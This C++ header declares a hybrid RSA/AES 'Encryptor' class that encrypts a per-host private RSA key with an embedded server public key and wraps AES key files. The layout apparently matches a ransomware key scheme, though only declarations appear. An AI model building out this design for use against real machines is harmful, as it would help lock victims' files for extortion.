
#ifndef BUTTERFLY_ENCRYPTOR_H
#define BUTTERFLY_ENCRYPTOR_H

#include "crypto/rsaEncryptor.h"
#include "crypto/aesEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "params.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Encryptor to encrypt the AES and the CPrivateRSA key
 */
class Encryptor
{

private:
    int _keySize;
    //std::string _aesKey = "0123456789abcdefghijklabcdefg"; // TODO: get the string from the aes encryption class
    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
    std::unique_ptr<aes::AESEncryptor> _aesEncryptor;

public:
    /**
     * Constructor Encryptor
     */
    explicit Encryptor(int keySize = 2048);

    /**
     * Destructor Encryptor
     */
    ~Encryptor();

    /**
     * Encrypts the CPrivateRSA.pem and saves the bin file on the host machine
     */
    void encryptCPrivateRSA();

    /**
     * Encrypts the AES Key sql file to a binary file
     */
    void encryptAESKeyFile(const std::string &filepath);

};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_ENCRYPTOR_H
